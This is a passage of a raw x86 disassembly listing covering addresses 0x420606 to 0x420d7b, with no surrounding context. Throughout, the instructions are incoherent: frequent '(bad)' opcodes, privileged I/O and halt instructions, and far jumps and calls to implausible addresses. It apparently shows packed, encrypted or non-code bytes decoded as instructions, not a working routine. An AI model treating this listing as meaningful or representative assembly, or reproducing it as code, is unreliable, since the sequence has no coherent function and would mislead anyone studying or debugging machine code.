  420606:	retf   0x8f
  420609:	into   
  42060a:	sub    eax,0x39c4d3f6
  42060f:	out    dx,eax
  420610:	mov    ah,0x9a
  420612:	(bad)  
  420613:	jp     0x42061b
  420615:	fstp   st(5)
  420617:	xlat   BYTE PTR ds:[ebx]
  420618:	push   eax
  420619:	scas   eax,DWORD PTR es:[edi]
  42061a:	or     DWORD PTR [eax-0x68],ebx
  42061d:	mov    ebp,0xba78bfb0
  420622:	outs   dx,DWORD PTR ds:[esi]
  420623:	sub    edi,ebx
  420625:	jmp    0x420671
  420627:	pop    ss
  420628:	xor    ah,BYTE PTR [esi-0x51]
  42062b:	mov    esp,0xfc4eea99
  420630:	and    DWORD PTR [edi],eax
  420632:	and    al,BYTE PTR [esi]
  420634:	out    dx,al
  420635:	pop    es
  420636:	loope  0x4205ba
  420638:	out    dx,eax
  420639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42063a:	jb     0x420636
  42063c:	xchg   edx,eax
  42063d:	mov    WORD PTR es:[ecx],ss
  420640:	std    
  420641:	scas   eax,DWORD PTR es:[edi]
  420642:	ja     0x42066a
  420644:	jmp    0xc3342635
  420649:	retf   
  42064a:	(bad)  
  42064b:	popf   
  42064c:	dec    ecx
  42064d:	into   
  42064e:	lods   eax,DWORD PTR ds:[esi]
  42064f:	cs push edi
  420651:	ds mov edi,0x380928b8
  420657:	inc    ebp
  420658:	gs mov bl,0xf8
  42065b:	push   0x9960b0bb
  420660:	push   ss
  420661:	les    eax,FWORD PTR [edx+0x4a21c99f]
  420667:	in     eax,dx
  420668:	icebp  
  420669:	call   DWORD PTR [eax]
  42066b:	mov    ch,0xab
  42066d:	jo     0x4206ba
  42066f:	fucomip st,st(1)
  420671:	push   esi
  420672:	cdq    
  420673:	and    bh,BYTE PTR [edx]
  420675:	jne    0x420603
  420677:	jno    0x420622
  420679:	sbb    eax,0xc30af8ce
  42067e:	bnd ret 0xa0c2
  420682:	aad    0x1d
  420684:	nop
  420685:	aad    0x5e
  420687:	sbb    eax,0x7f33f948
  42068c:	dec    edi
  42068d:	or     ecx,DWORD PTR [edi-0x56]
  420690:	retf   
  420691:	(bad)  
  420692:	int3   
  420693:	sub    ebx,DWORD PTR [ebx+0x57]
  420696:	inc    ebp
  420697:	mov    WORD PTR [ecx+ecx*2],ds
  42069a:	lods   eax,DWORD PTR ds:[esi]
  42069b:	dec    edi
  42069c:	nop
  42069d:	(bad)  
  42069e:	(bad)  
  42069f:	fwait
  4206a0:	rcl    BYTE PTR [ecx],1
  4206a2:	sbb    al,0x81
  4206a4:	mov    dh,0x35
  4206a6:	add    al,0x6b
  4206a8:	fcomp  QWORD PTR [ebx+0x34527c57]
  4206ae:	push   edi
  4206af:	push   cs
  4206b0:	xor    ch,al
  4206b2:	(bad)  
  4206b3:	cmp    ah,BYTE PTR [ecx-0x40541fb4]
  4206b9:	loopne 0x42065e
  4206bb:	dec    DWORD PTR [esi+0x2f9b6f8a]
  4206c1:	mov    ah,0x8f
  4206c3:	out    dx,al
  4206c4:	mov    ecx,0x1f8283e9
  4206c9:	or     dl,cl
  4206cb:	dec    esp
  4206cc:	iret   
  4206cd:	mov    DWORD PTR [ebx+eax*2+0x67],edx
  4206d1:	dec    edi
  4206d2:	mov    cl,0xce
  4206d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206d5:	ret    0x914f
  4206d8:	data16 in al,0xd4
  4206db:	sub    eax,0xd4182f9
  4206e0:	mov    cl,0x70
  4206e2:	(bad)  
  4206e3:	jne    0x4206e4
  4206e5:	ret    0xdd3
  4206e8:	jp     0x4206dc
  4206ea:	mov    ch,0xb3
  4206ec:	cmp    dl,dh
  4206ee:	xor    ecx,DWORD PTR [ecx-0x2d]
  4206f1:	xchg   edi,eax
  4206f2:	popf   
  4206f3:	or     DWORD PTR [ecx-0x7],esp
  4206f6:	cli    
  4206f7:	loop   0x42076b
  4206f9:	scas   eax,DWORD PTR es:[edi]
  4206fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206fb:	xchg   DWORD PTR [eax-0x45],edi
  4206fe:	add    BYTE PTR [ebx],cl
  420700:	cmc    
  420701:	div    bl
  420703:	je     0x420747
  420705:	sbb    eax,0xccce1123
  42070a:	leave  
  42070b:	or     BYTE PTR [ebp-0x59],bl
  42070e:	(bad)  
  42070f:	loop   0x42069f
  420711:	adc    BYTE PTR [eax-0xd],al
  420714:	sub    BYTE PTR [ebp-0x53c91e19],bh
  42071a:	xchg   al,dl
  42071c:	push   cs
  42071d:	sub    BYTE PTR [edi+edx*4-0x65],0x68
  420722:	sbb    ah,BYTE PTR [esi]
  420724:	ins    BYTE PTR es:[edi],dx
  420725:	test   eax,0x9152119d
  42072a:	shl    DWORD PTR [esi],0xdb
  42072d:	fistp  DWORD PTR [edi-0x494c00f9]
  420733:	imul   esp,DWORD PTR [edx+0x7075842c],0x65d20138
  42073d:	pop    edi
  42073e:	ins    BYTE PTR es:[edi],dx
  42073f:	ss push esp
  420741:	pop    ecx
  420742:	cwde   
  420743:	(bad)  
  420744:	aam    0x6b
  420746:	mov    bl,0x2e
  420748:	mov    al,0x1a
  42074a:	in     al,0x8d
  42074c:	mov    DWORD PTR [esp+esi*2+0x45],ebx
  420750:	inc    ebp
  420751:	jge    0x4206da
  420753:	dec    esp
  420754:	retf   
  420755:	xlat   BYTE PTR ds:[ebx]
  420756:	hlt    
  420757:	xor    BYTE PTR [edi-0x64],cl
  42075a:	daa    
  42075b:	pop    ecx
  42075c:	int3   
  42075d:	mov    ebx,0x82c9a248
  420762:	(bad)  
  420763:	(bad)  
  420764:	sti    
  420765:	inc    edx
  420766:	xchg   cx,ax
  420768:	and    BYTE PTR [ebp+0x49],0x2c
  42076c:	push   ebx
  42076d:	pop    ss
  42076e:	(bad)  
  42076f:	pusha  
  420770:	dec    ebx
  420771:	mov    WORD PTR [ecx-0x1c8df544],ds
  420777:	rcr    ebp,cl
  420779:	add    BYTE PTR [ebx+0x4ffdc1da],bl
  42077f:	xchg   esi,eax
  420780:	mov    dh,BYTE PTR [ebx]
  420782:	cmp    eax,0x3719918b
  420787:	inc    esi
  420788:	mov    ebp,0x8ba5e0b4
  42078d:	add    DWORD PTR ds:0xd1c5e80b,esp
  420793:	add    eax,0xba5da5ae
  420798:	in     eax,dx
  420799:	pop    esp
  42079a:	in     eax,dx
  42079b:	xchg   esp,eax
  42079c:	jecxz  0x4207f6
  42079e:	pop    ss
  42079f:	out    0x80,eax
  4207a1:	aam    0x47
  4207a3:	cld    
  4207a4:	in     al,dx
  4207a5:	fild   DWORD PTR [edx+ebx*4+0x5e]
  4207a9:	idiv   DWORD PTR cs:[ebx]
  4207ac:	jmp    0x45459347
  4207b1:	mov    edx,0x13f60c3e
  4207b6:	inc    esp
  4207b7:	jnp    0x42074d
  4207b9:	dec    edi
  4207ba:	inc    eax
  4207bb:	ja     0x4207ea
  4207bd:	jbe    0x4207e4
  4207bf:	aad    0x56
  4207c1:	popf   
  4207c2:	sbb    DWORD PTR ds:0x24a22965,ecx
  4207c8:	lea    esp,[ebp+edx*1-0x27]
  4207cc:	ss or  al,0x87
  4207cf:	pop    eax
  4207d0:	or     edx,DWORD PTR [edi]
  4207d2:	mov    al,0x89
  4207d4:	dec    ecx
  4207d5:	(bad)  [ebp+ebx*1-0x56aed751]
  4207dc:	daa    
  4207dd:	xchg   ebx,eax
  4207de:	xchg   esi,eax
  4207df:	int    0x22
  4207e1:	pop    es
  4207e2:	fnsave [eax+0x51]
  4207e5:	icebp  
  4207e6:	lock and edi,esi
  4207e9:	xchg   ebx,eax
  4207ea:	or     BYTE PTR [edx],dl
  4207ec:	mov    edi,ecx
  4207ee:	ret    
  4207ef:	(bad)  
  4207f0:	mov    eax,0xd8b2d541
  4207f5:	cld    
  4207f6:	ss and al,0xee
  4207f9:	(bad)  
  4207fb:	add    dl,BYTE PTR [esi+0x7c]
  4207fe:	mov    al,ds:0xec22de28
  420803:	adc    BYTE PTR [eax+0x3d2b3c9f],dl
  420809:	adc    BYTE PTR [edx+0x3c],ch
  42080c:	mov    cl,0x45
  42080e:	dec    eax
  42080f:	call   0xbfa607fd
  420814:	sbb    ebp,DWORD PTR [ebx-0x61]
  420817:	and    eax,0x1e0447c5
  42081c:	cli    
  42081d:	inc    eax
  42081e:	push   ss
  42081f:	or     BYTE PTR [eax],al
  420821:	jle    0x420839
  420823:	and    DWORD PTR [eax],esi
  420825:	enter  0x5ac3,0xee
  420829:	push   esp
  42082a:	fisttp DWORD PTR [edx-0x183796cf]
  420830:	sub    eax,0xf3f5b214
  420835:	clc    
  420836:	inc    edi
  420837:	fdivr  QWORD PTR [ecx]
  420839:	aaa    
  42083a:	xor    DWORD PTR [esi+0xd],ebp
  42083d:	pop    esi
  42083e:	push   0x1e6cb139
  420843:	cmp    al,al
  420845:	ror    BYTE PTR [bx-0x7e],cl
  420849:	pop    ds
  42084a:	fs mov ebx,0xd80be1f1
  420850:	(bad)  
  420851:	cmp    eax,DWORD PTR [esp+eiz*2-0xf]
  420855:	add    dl,BYTE PTR [eax-0x6b]
  420858:	ret    
  420859:	(bad)  
  42085a:	dec    eax
  42085b:	inc    ebx
  42085c:	outs   dx,DWORD PTR ds:[esi]
  42085d:	fiadd  DWORD PTR ss:[esi-0x14a5e4f9]
  420864:	in     al,0xf3
  420866:	and    cl,dh
  420868:	in     al,0x57
  42086a:	cmp    eax,0xf51f191b
  42086f:	and    BYTE PTR [ebx],ah
  420871:	and    DWORD PTR [ebp-0xe152b75],esi
  420877:	add    eax,0xd908cc2
  42087c:	pop    esp
  42087d:	repnz call 0x8ae1:0x9a301043
  420885:	jmp    0x3538:0x4555200f
  42088c:	jge    0x420840
  42088e:	jne    0x4208b2
  420890:	jbe    0x4208be
  420892:	mov    al,ds:0x3aa45383
  420897:	adc    esp,ecx
  420899:	leave  
  42089a:	pop    ecx
  42089b:	pop    eax
  42089c:	fwait
  42089d:	adc    al,0xd1
  42089f:	call   0x8c87:0xe3102da5
  4208a6:	jae    0x420879
  4208a8:	test   al,0xbf
  4208aa:	fld    QWORD PTR [ebx]
  4208ac:	push   esi
  4208ad:	retf   0xe3c8
  4208b0:	in     eax,dx
  4208b1:	test   DWORD PTR ds:0x794a74db,edx
  4208b7:	stos   DWORD PTR es:[edi],eax
  4208b8:	fcmovne st,st(7)
  4208ba:	pop    ebx
  4208bb:	mov    al,0x6
  4208bd:	sbb    DWORD PTR [eax+0x678d6094],esp
  4208c3:	ja     0x4208a1
  4208c5:	xchg   ebx,eax
  4208c6:	std    
  4208c7:	hlt    
  4208c8:	lea    edi,[ecx+0x22]
  4208cb:	jp     0x4208b3
  4208cd:	sbb    esi,esp
  4208cf:	or     BYTE PTR ds:0xd93ed053,cl
  4208d5:	pop    es
  4208d6:	or     al,0xc3
  4208d8:	mov    dl,0x7c
  4208da:	cli    
  4208db:	dec    ebp
  4208dc:	fistp  QWORD PTR [eax-0x4cc603b2]
  4208e2:	sub    al,0x25
  4208e4:	push   esp
  4208e5:	mov    ds,WORD PTR [edi+edi*4]
  4208e8:	push   eax
  4208e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ea:	xchg   BYTE PTR [edi+0x78],dh
  4208ed:	mov    WORD PTR gs:[ebx],?
  4208f0:	pop    ss
  4208f1:	push   ecx
  4208f2:	jne    0x420902
  4208f4:	pop    esp
  4208f5:	loope  0x4208a9
  4208f7:	pusha  
  4208f8:	xor    esp,DWORD PTR [edi]
  4208fa:	mov    eax,0xe9383c44
  4208ff:	fwait
  420900:	iret   
  420901:	xlat   BYTE PTR ds:[ebx]
  420902:	cli    
  420903:	in     al,0x9f
  420905:	sub    ebx,DWORD PTR [ebx+0x7854d757]
  42090b:	loope  0x42092e
  42090d:	jae    0x420897
  42090f:	xor    ch,ch
  420911:	test   DWORD PTR [ebx],edi
  420913:	push   ebx
  420914:	dec    edi
  420915:	std    
  420916:	scas   al,BYTE PTR es:[edi]
  420917:	jmp    FWORD PTR ds:[esi]
  42091a:	or     eax,DWORD PTR [ebx+ebx*1]
  42091d:	push   0xb45990ed
  420922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420923:	add    edx,DWORD PTR [esi+0x476cc3ab]
  420929:	inc    edx
  42092a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092b:	xor    WORD PTR [edx-0x6a],0xefb7
  420931:	out    dx,al
  420932:	in     al,dx
  420933:	sub    al,0x0
  420935:	dec    ebx
  420936:	not    BYTE PTR [ebp-0x60]
  420939:	xchg   edx,eax
  42093a:	jne    0x42091b
  42093c:	cli    
  42093d:	xchg   edx,eax
  42093e:	scas   eax,DWORD PTR es:[edi]
  42093f:	bound  ebp,QWORD PTR [esi-0x1d743af2]
  420945:	inc    ecx
  420946:	retf   0xe007
  420949:	xor    ecx,DWORD PTR [ebx-0x25fcc67b]
  42094f:	pop    edi
  420950:	mov    eax,0x931dd5
  420955:	push   edx
  420956:	jecxz  0x42097f
  420958:	lods   al,BYTE PTR ds:[esi]
  420959:	adc    BYTE PTR [ebp+0x4b537572],ch
  42095f:	das    
  420960:	mov    edi,0x6f4a2377
  420965:	push   es
  420966:	jo     0x4209c8
  420968:	and    esi,DWORD PTR [ebx]
  42096a:	jbe    0x420924
  42096c:	push   eax
  42096d:	ds scas al,BYTE PTR es:[edi]
  42096f:	cli    
  420970:	cs mov ecx,0x7e3200df
  420976:	dec    ecx
  420977:	rol    dl,1
  420979:	and    DWORD PTR [esi+0x69],0x2d2f8df9
  420980:	xchg   ecx,eax
  420981:	push   edx
  420982:	mov    bh,0x69
  420984:	mov    ecx,0x697e47cf
  420989:	mov    al,0xf4
  42098b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42098c:	(bad)  
  42098d:	jmp    0x9e30c2d7
  420992:	inc    ecx
  420993:	ins    WORD PTR es:[edi],dx
  420995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420996:	jns    0x420921
  420998:	xchg   edi,eax
  420999:	outs   dx,DWORD PTR ds:[esi]
  42099a:	lods   al,BYTE PTR ds:[esi]
  42099b:	mov    eax,0x6418fdec
  4209a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a1:	loop   0x42096a
  4209a3:	push   0xf
  4209a5:	xchg   BYTE PTR [eax+0x441eadd5],ah
  4209ab:	xchg   ecx,eax
  4209ac:	jecxz  0x4209d8
  4209ae:	inc    ebx
  4209af:	lock ror BYTE PTR es:[ecx-0x14a77292],cl
  4209b7:	and    DWORD PTR [ecx-0x101f8ebf],esp
  4209bd:	pop    es
  4209be:	sar    DWORD PTR [edi+0x397dfaf1],0xc2
  4209c5:	pop    esi
  4209c6:	xor    al,0x2c
  4209c8:	adc    al,0xce
  4209ca:	adc    edx,ebx
  4209cc:	nop
  4209cd:	xor    DWORD PTR [edi-0x2f],edi
  4209d0:	in     eax,dx
  4209d1:	sbb    eax,0x11992d0e
  4209d6:	cmc    
  4209d7:	adc    al,0xcd
  4209d9:	rcr    BYTE PTR [eax],cl
  4209db:	push   esi
  4209dc:	cmp    eax,0xfb910fb0
  4209e1:	jecxz  0x420a08
  4209e3:	mov    esi,0x7e03b649
  4209e8:	aam    0x41
  4209ea:	ror    DWORD PTR [esi],0xf1
  4209ed:	inc    ebp
  4209ee:	bound  ecx,QWORD PTR [ebx+0x4]
  4209f1:	(bad)  
  4209f2:	sub    al,0xfb
  4209f4:	dec    eax
  4209f5:	sbb    BYTE PTR [ebx+0x4cd48f4e],ch
  4209fb:	pop    es
  4209fc:	inc    esp
  4209fd:	stos   BYTE PTR es:[edi],al
  4209fe:	retf   
  4209ff:	leave  
  420a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a01:	imul   ebx,DWORD PTR fs:[edi+0x216d4b04],0xffffffc4
  420a09:	stos   BYTE PTR es:[edi],al
  420a0a:	push   edi
  420a0b:	mov    bl,bh
  420a0d:	lock sub al,0xa8
  420a10:	push   ss
  420a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a12:	mov    al,0x44
  420a14:	retf   
  420a15:	mul    BYTE PTR [ebx-0x5b419481]
  420a1b:	test   al,0x4c
  420a1d:	inc    ebx
  420a1e:	scas   eax,DWORD PTR es:[edi]
  420a1f:	mul    eax
  420a21:	inc    ebp
  420a22:	inc    esp
  420a23:	test   BYTE PTR [ecx+0x26],dh
  420a26:	out    dx,eax
  420a27:	jne    0x4209ff
  420a29:	dec    edi
  420a2a:	add    al,0xdc
  420a2c:	mov    ah,0x8f
  420a2e:	or     BYTE PTR ds:0xe07f80e2,0x74
  420a35:	push   ss
  420a36:	adc    DWORD PTR [esi+0x1a],ebx
  420a39:	sar    BYTE PTR [ecx],cl
  420a3b:	mov    ch,0x97
  420a3d:	add    al,0x25
  420a3f:	push   edi
  420a40:	fcomp  DWORD PTR [edi]
  420a42:	test   al,0xe9
  420a44:	scas   al,BYTE PTR es:[edi]
  420a45:	int    0xee
  420a47:	lock call 0x41556cc0
  420a4d:	test   DWORD PTR [edi],ecx
  420a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a50:	inc    ecx
  420a51:	cmc    
  420a52:	dec    edx
  420a53:	mov    dl,0xa9
  420a55:	dec    esi
  420a56:	loop   0x420a7c
  420a58:	inc    edx
  420a59:	enter  0x680c,0xc3
  420a5d:	jle    0x420aa8
  420a5f:	stos   DWORD PTR es:[edi],eax
  420a60:	cld    
  420a61:	mov    edi,eax
  420a63:	adc    dl,ah
  420a65:	aaa    
  420a66:	aam    0x4f
  420a68:	js     0x420a5b
  420a6a:	(bad)  
  420a6b:	or     al,0x1f
  420a6d:	(bad)  ds:0xf1f3f0a
  420a73:	inc    esi
  420a74:	xchg   esp,eax
  420a75:	mov    BYTE PTR [eax+0x7a],bl
  420a78:	mov    edx,ecx
  420a7a:	int    0x57
  420a7c:	jle    0x420a19
  420a7e:	mov    ch,0xa7
  420a80:	clc    
  420a81:	mov    eax,0xcd78e439
  420a86:	ret    0x9171
  420a89:	mov    bh,ah
  420a8b:	stc    
  420a8c:	sub    dl,bh
  420a8e:	sub    al,0x6b
  420a90:	jle    0x420a37
  420a92:	xchg   BYTE PTR [esi-0x28890215],al
  420a98:	jns    0x420a9d
  420a9a:	pop    esi
  420a9b:	push   cs
  420a9c:	mov    al,bh
  420a9e:	and    dl,BYTE PTR [eax+edi*1-0x774f2a92]
  420aa5:	in     al,dx
  420aa6:	add    DWORD PTR [edi+0x40],esi
  420aa9:	or     eax,0x505c8034
  420aae:	mov    esp,0xb515d1c1
  420ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ab4:	nop
  420ab5:	imul   edi,eax,0x3d
  420ab8:	jnp    0x420a76
  420aba:	sbb    edx,0xffffffd2
  420abd:	vpmulhuw ymm2,ymm6,ymm2
  420ac1:	pop    ss
  420ac2:	aas    
  420ac3:	dec    ebp
  420ac4:	and    BYTE PTR [edx-0x67cc4b6c],ah
  420aca:	or     esi,DWORD PTR [edx+eax*4-0x68cf25e6]
  420ad1:	ja     0x420b0a
  420ad3:	xchg   ebp,eax
  420ad4:	mov    ebx,0xeefd2506
  420ad9:	inc    ebx
  420ada:	(bad)  
  420adb:	shl    DWORD PTR [ebx],1
  420add:	imul   esp,DWORD PTR [edx+eiz*2+0x78574a0a],0xd350b4a1
  420ae8:	nop
  420ae9:	lods   eax,DWORD PTR ds:[si]
  420aeb:	push   edx
  420aec:	cmp    ch,0x65
  420aef:	call   0xf323:0xf75cc25b
  420af6:	inc    ebp
  420af7:	dec    ebp
  420af8:	in     al,0x55
  420afa:	pop    edx
  420afb:	imul   esp,ecx,0xffffffc9
  420afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aff:	fstp   TBYTE PTR [edx]
  420b01:	and    BYTE PTR es:[ecx-0x18],bl
  420b05:	sub    ebx,DWORD PTR [ecx-0x25]
  420b08:	xchg   ecx,eax
  420b09:	push   es
  420b0a:	or     al,0x99
  420b0c:	ins    DWORD PTR es:[edi],dx
  420b0d:	mov    esi,0x4a32171
  420b12:	stc    
  420b13:	lods   al,BYTE PTR ds:[esi]
  420b14:	dec    esi
  420b15:	loope  0x420b28
  420b17:	std    
  420b18:	sbb    BYTE PTR [ebx+eax*8+0x155ee8cd],dl
  420b1f:	pop    esp
  420b20:	add    esi,DWORD PTR [edi]
  420b22:	and    eax,0xa600cf94
  420b27:	cwde   
  420b28:	addr16 cld 
  420b2a:	push   ebp
  420b2b:	leave  
  420b2c:	sbb    al,0xf4
  420b2e:	mov    ch,0x39
  420b30:	jnp    0x420b82
  420b32:	and    DWORD PTR [edx+0x2c],eax
  420b35:	scas   al,BYTE PTR es:[edi]
  420b36:	in     al,dx
  420b37:	jbe    0x420b0c
  420b39:	stos   DWORD PTR es:[edi],eax
  420b3a:	add    al,0xb8
  420b3c:	cmp    ah,BYTE PTR [eax]
  420b3e:	inc    ebp
  420b3f:	pop    ebp
  420b40:	(bad)  
  420b41:	fcom   QWORD PTR ds:0x787cda24
  420b47:	enter  0x9ea0,0xcb
  420b4b:	jbe    0x420bb3
  420b4d:	mov    ah,0x2f
  420b4f:	cmp    eax,ebx
  420b51:	jbe    0x420b33
  420b53:	push   0xffffffe0
  420b55:	mov    esi,0xa7614960
  420b5a:	cmp    BYTE PTR [edi-0x33],bl
  420b5d:	xor    ah,BYTE PTR [ebp+0x47]
  420b60:	lea    edx,[edi+0x5e]
  420b63:	mov    edi,ecx
  420b65:	mov    edi,0xb6d68419
  420b6a:	mov    edx,0x2e091edc
  420b6f:	xor    ebx,DWORD PTR [ebx+0x40]
  420b72:	cmp    edx,DWORD PTR [ecx]
  420b74:	pop    edi
  420b75:	xchg   edx,eax
  420b76:	clc    
  420b77:	repz dec ecx
  420b79:	dec    edi
  420b7a:	dec    eax
  420b7b:	mov    esp,0xcd815d35
  420b80:	adc    eax,0xdc61b0d9
  420b85:	jmp    0x2594c522
  420b8a:	cmp    eax,0x6f471ae
  420b8f:	cmp    ebx,edx
  420b91:	xchg   edx,eax
  420b92:	jmp    0x420bf7
  420b94:	test   al,0x9a
  420b96:	mov    edi,0x6f74adf3
  420b9b:	cs jae 0x420bbb
  420b9e:	daa    
  420b9f:	pusha  
  420ba0:	or     eax,0xa126e46b
  420ba5:	(bad)  
  420ba6:	ss push ss
  420ba8:	fimul  WORD PTR [esi-0x31ef6db0]
  420bae:	inc    edi
  420baf:	mov    ch,0x33
  420bb1:	lock pop ebx
  420bb3:	push   ss
  420bb4:	dec    edx
  420bb5:	add    DWORD PTR [ebx-0x60],edi
  420bb8:	cmp    al,0x53
  420bba:	push   eax
  420bbb:	lea    esp,[ebx-0x2b]
  420bbe:	neg    BYTE PTR [eax-0x61]
  420bc1:	mov    esi,0x59defe17
  420bc6:	shr    BYTE PTR [ebp-0x76],1
  420bc9:	sbb    al,0x2
  420bcb:	sbb    bl,0xaa
  420bce:	aad    0x38
  420bd0:	pop    edi
  420bd1:	test   eax,0x8ca5d435
  420bd6:	int3   
  420bd7:	adc    al,0x2a
  420bd9:	stos   BYTE PTR es:[edi],al
  420bda:	outs   dx,BYTE PTR ds:[esi]
  420bdb:	sar    DWORD PTR [edx-0x64],cl
  420bde:	fisubr DWORD PTR [edx-0x32d5fdf5]
  420be4:	or     esi,ebx
  420be6:	mov    ebx,0xf58db5a8
  420beb:	mov    dh,0x69
  420bed:	or     cl,BYTE PTR [ecx]
  420bef:	push   esp
  420bf0:	or     al,0xbe
  420bf2:	xchg   ebx,eax
  420bf3:	shl    DWORD PTR [edx+edx*2+0x33389c3],cl
  420bfa:	inc    eax
  420bfb:	inc    esp
  420bfc:	lods   eax,DWORD PTR ds:[esi]
  420bfd:	pop    ss
  420bfe:	shr    DWORD PTR [edi-0x2d8c4d01],cl
  420c04:	mov    bl,0x75
  420c06:	or     eax,0xa1b6ba81
  420c0b:	outs   dx,BYTE PTR ds:[esi]
  420c0c:	xchg   ebp,eax
  420c0d:	dec    esi
  420c0e:	and    ebx,DWORD PTR [ebp-0x57aa23db]
  420c14:	xchg   ebp,eax
  420c15:	(bad)  
  420c16:	mov    edx,0xb4b90278
  420c1b:	jbe    0x420c0a
  420c1d:	and    al,0x53
  420c1f:	or     DWORD PTR [edx+eiz*2],eax
  420c22:	rcl    al,0xb0
  420c25:	cli    
  420c26:	pop    esp
  420c27:	int3   
  420c28:	fsubr  DWORD PTR [ecx+0x54a33c9d]
  420c2e:	lea    esp,[esi]
  420c30:	imul   ecx,DWORD PTR [eax-0x2d],0x1d
  420c34:	aaa    
  420c35:	add    edx,ebx
  420c37:	mov    DWORD PTR [esi+edi*4+0x57],esi
  420c3b:	or     al,0x96
  420c3d:	xchg   esp,eax
  420c3e:	mov    ah,0x11
  420c40:	outs   dx,BYTE PTR ds:[esi]
  420c41:	in     al,0x10
  420c43:	jg     0x420bdf
  420c45:	dec    eax
  420c46:	inc    esi
  420c47:	mov    cl,0xd9
  420c49:	icebp  
  420c4a:	and    al,bl
  420c4c:	out    0x77,al
  420c4e:	mov    ch,BYTE PTR [ebx-0x36]
  420c51:	imul   eax,ebp,0x6bbf1381
  420c57:	sbb    al,0x42
  420c59:	xor    edx,DWORD PTR [esi-0x49e251fb]
  420c5f:	retf   0xb0b0
  420c62:	ja     0x420c6f
  420c64:	inc    ebp
  420c65:	mov    ds:0x68e0e842,eax
  420c6a:	test   al,0x71
  420c6c:	push   cs
  420c6d:	or     edx,DWORD PTR [esi-0xe]
  420c70:	jmp    0x420c1f
  420c72:	xchg   ecx,eax
  420c73:	fist   DWORD PTR [ebp-0x16248ea7]
  420c79:	retf   0xaa7c
  420c7c:	push   0xd
  420c7e:	cmp    edi,DWORD PTR [edx-0x1d64942f]
  420c84:	iret   
  420c85:	pop    ebx
  420c86:	cmp    BYTE PTR [eax+0x17],al
  420c89:	jmp    0x3006cf13
  420c8e:	lock adc cl,bh
  420c91:	pop    edi
  420c92:	inc    eax
  420c93:	fwait
  420c94:	inc    ecx
  420c95:	loope  0x420c7b
  420c97:	int    0x9
  420c99:	es gs daa 
  420c9c:	int3   
  420c9d:	jl     0x420d10
  420c9f:	sub    ebx,0xb
  420ca2:	int3   
  420ca3:	inc    edx
  420ca4:	push   ds
  420ca5:	pop    eax
  420ca6:	mov    al,0x3
  420ca8:	cld    
  420ca9:	scas   eax,DWORD PTR es:[edi]
  420caa:	mov    dh,0x6e
  420cac:	xor    al,0x86
  420cae:	adc    edx,edi
  420cb0:	outs   dx,DWORD PTR ds:[esi]
  420cb1:	mov    eax,DWORD PTR [eax+0x46]
  420cb4:	mov    ?,WORD PTR [edx]
  420cb6:	and    al,0x1
  420cb8:	icebp  
  420cb9:	or     al,0x8
  420cbb:	mov    eax,ds:0x8f3c5629
  420cc0:	std    
  420cc1:	aaa    
  420cc2:	sub    esi,DWORD PTR [ebx-0x6ffb1f1f]
  420cc8:	xchg   edi,eax
  420cc9:	or     ch,ch
  420ccb:	stos   BYTE PTR es:[edi],al
  420ccc:	nop
  420ccd:	mov    edi,0x19e8365c
  420cd2:	retf   
  420cd3:	popf   
  420cd4:	retf   
  420cd5:	xchg   edx,eax
  420cd6:	mov    ebp,0xf04d5a04
  420cdb:	pop    ds
  420cdc:	mov    edx,0xbd1b8a56
  420ce1:	retf   0x47b1
  420ce4:	les    ecx,FWORD PTR [eax-0x7760de11]
  420cea:	and    eax,0x4a2d353d
  420cef:	test   dh,al
  420cf1:	sub    ebx,DWORD PTR [ebx]
  420cf3:	fs mov edx,0x9f8b2644
  420cf9:	dec    esp
  420cfa:	out    dx,al
  420cfb:	ja     0x420ccd
  420cfd:	shr    DWORD PTR [ebx+0x74],0xcb
  420d01:	shl    esi,1
  420d03:	in     al,0x78
  420d05:	fsubr  DWORD PTR [edi]
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	dec    ebx
  420d09:	js     0x420d43
  420d0b:	(bad)
  420d10:	push   edx
  420d11:	mov    ebp,0xef650948
  420d16:	(bad)  
  420d17:	mov    dh,0x8e
  420d19:	inc    edx
  420d1a:	jge    0x420d48
  420d1c:	rdtsc  
  420d1e:	mov    ebp,DWORD PTR [eiz*4+0x337d2a25]
  420d25:	stc    
  420d26:	nop
  420d27:	xchg   ebp,eax
  420d28:	loopne 0x420d5a
  420d2a:	jno    0x420d7f
  420d2c:	popf   
  420d2d:	or     BYTE PTR [ebx-0x15c211e7],al
  420d33:	in     al,0xae
  420d35:	xchg   BYTE PTR ds:0xcecf8892,al
  420d3b:	nop
  420d3c:	sar    DWORD PTR [eax+0x44693be6],1
  420d42:	sbb    ebp,DWORD PTR [eax-0x19]
  420d45:	das    
  420d46:	mov    edx,ebx
  420d48:	daa    
  420d49:	mov    eax,0xe83511ff
  420d4e:	int    0xfb
  420d50:	nop
  420d51:	in     eax,0x89
  420d53:	or     edx,DWORD PTR [edi+0x36]
  420d56:	aas    
  420d57:	mov    eax,ds:0x8e4890ba
  420d5c:	inc    ecx
  420d5d:	pop    ebp
  420d5e:	aas    
  420d5f:	dec    ebx
  420d60:	mov    dl,0x6e
  420d62:	xchg   esp,eax
  420d63:	(bad)  
  420d64:	int    0x2e
  420d66:	add    BYTE PTR [ebp+0x1],cl
  420d69:	xchg   edi,eax
  420d6a:	xchg   ebx,eax
  420d6b:	int    0xcb
  420d6d:	pop    esp
  420d6e:	mov    ds:0x34e9ce7f,al
  420d73:	scas   eax,DWORD PTR es:[edi]
  420d74:	sbb    ecx,DWORD PTR [ebx]
  420d76:	out    dx,eax
  420d77:	cmp    DWORD PTR [ebx+0x2],ecx
  420d7a:	push   ecx
  420d7b:	pop    edi
